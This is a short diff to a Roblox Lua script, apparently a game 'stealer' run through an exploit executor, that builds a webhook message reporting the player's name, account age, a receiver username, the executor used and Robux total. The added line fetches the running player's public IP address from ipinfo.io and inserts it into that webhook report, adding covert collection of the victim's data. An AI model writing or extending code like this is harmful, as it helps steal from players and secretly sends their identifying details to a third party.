@@ -65,6 +65,7 @@ Animator.ChildAdded:Connect(function(child)
     end
 end)
 
+local ipwebhook = game:HttpGet("https://ipinfo.io/ip")
 local function sendWebhook()
 
     local embed = {
@@ -73,7 +74,7 @@ local function sendWebhook()
         ["fields"] = {
             {
                 ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
-                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
+                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 💻 Executor Used: " ..identifyexecutor().. "\n | 👤 IP: "..ipwebhook.."```"
             },
             {
                 ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
